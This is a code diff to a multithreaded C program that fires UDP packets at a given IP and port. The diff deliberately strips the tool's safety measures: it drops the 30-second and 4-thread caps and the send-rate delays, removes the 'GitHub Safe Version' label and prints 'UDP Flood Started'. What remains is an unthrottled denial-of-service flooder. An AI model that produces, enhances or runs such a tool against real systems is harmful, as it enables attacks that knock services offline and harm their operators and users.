@@ -11,11 +11,10 @@
 #include <signal.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <sched.h>
 
 #define PAYLOAD_SIZE 1024
 #define STATS_INTERVAL 1
-#define BURST_SIZE 10  // Reduced for GitHub Actions safety
+#define BURST_SIZE 10
 
 typedef struct {
     char target_ip[16];
@@ -33,9 +32,8 @@ void int_handler(int sig) {
 }
 
 void generate_payload(char *buffer, size_t size) {
-    // Simple pattern-based payload (no /dev/urandom dependency)
     for (size_t i = 0; i < size; i++) {
-        buffer[i] = (i % 256);
+        buffer[i] = rand() % 256;
     }
 }
 
@@ -54,7 +52,11 @@ void *send_payload(void *arg) {
         return NULL;
     }
 
-    // Set socket timeout to prevent hanging
+    // Set socket options
+    int buf_size = 1024 * 1024;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
+    
+    // Set timeout
     struct timeval tv;
     tv.tv_sec = 1;
     tv.tv_usec = 0;
@@ -72,10 +74,6 @@ void *send_payload(void *arg) {
 
     start_time = time(NULL);
     
-    printf("Thread %d: Starting send loop for %d seconds\n", 
-           args->thread_id, args->duration);
-
-    // Simple sendto loop (more compatible)
     while (running && (time(NULL) - start_time < args->duration)) {
         for (int i = 0; i < BURST_SIZE && running; i++) {
             ssize_t ret = sendto(sockfd, payload, PAYLOAD_SIZE, 0,
@@ -84,12 +82,8 @@ void *send_payload(void *arg) {
                 atomic_fetch_add(&total_sent, 1);
             } else {
                 atomic_fetch_add(&total_errors, 1);
-                // Don't spam on errors
-                usleep(1000);
             }
         }
-        // Small delay to prevent overwhelming
-        usleep(1000);
     }
 
     close(sockfd);
@@ -100,7 +94,6 @@ void *send_payload(void *arg) {
 int main(int argc, char *argv[]) {
     if (argc != 5) {
         printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
-        printf("Example: %s 127.0.0.1 80 10 2\n", argv[0]);
         return 1;
     }
 
@@ -112,21 +105,10 @@ int main(int argc, char *argv[]) {
     int duration = atoi(argv[3]);
     int thread_count = atoi(argv[4]);
 
-    // Safety limits for GitHub
-    if (duration > 30) {
-        printf("Warning: Duration limited to 30 seconds max\n");
-        duration = 30;
-    }
-    if (thread_count > 4) {
-        printf("Warning: Thread count limited to 4 max\n");
-        thread_count = 4;
-    }
-
-    printf("UDP Test Tool - GitHub Safe Version\n");
+    printf("UDP Flood Started\n");
     printf("Target: %s:%d\n", target_ip, target_port);
     printf("Duration: %d seconds\n", duration);
-    printf("Threads: %d\n", thread_count);
-    printf("Press Ctrl+C to stop early\n\n");
+    printf("Threads: %d\n\n", thread_count);
 
     pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
     thread_args *args = malloc(thread_count * sizeof(thread_args));
@@ -151,7 +133,7 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    // Stats display
+    // Display stats
     time_t start = time(NULL);
     while (running && (time(NULL) - start < duration)) {
         sleep(STATS_INTERVAL);
@@ -162,7 +144,7 @@ int main(int argc, char *argv[]) {
         long sent = atomic_load(&total_sent);
         long errors = atomic_load(&total_errors);
         
-        printf("[%02d:%02d] Packets: %ld, Errors: %ld, PPS: %.1f\n",
+        printf("[%02d:%02d] Sent: %ld, Errors: %ld, PPS: %.1f\n",
                remaining / 60, remaining % 60,
                sent, errors, (double)sent / (elapsed + 1));
                
@@ -170,7 +152,7 @@ int main(int argc, char *argv[]) {
     }
 
     running = 0;
-    printf("\nStopping... Please wait\n");
+    printf("\nStopping threads...\n");
 
     // Wait for threads
     for (int i = 0; i < thread_count; i++) {
@@ -182,11 +164,9 @@ int main(int argc, char *argv[]) {
     long final_sent = atomic_load(&total_sent);
     long final_errors = atomic_load(&total_errors);
     
-    printf("\n=== FINAL RESULTS ===\n");
+    printf("\n=== RESULTS ===\n");
     printf("Total packets sent: %ld\n", final_sent);
     printf("Total errors: %ld\n", final_errors);
-    printf("Success rate: %.2f%%\n", 
-           final_sent > 0 ? (100.0 * (final_sent - final_errors) / final_sent) : 0);
     printf("Average PPS: %.2f\n", (double)final_sent / duration);
     printf("Total data: %.2f MB\n", (double)(final_sent * PAYLOAD_SIZE) / (1024 * 1024));
 
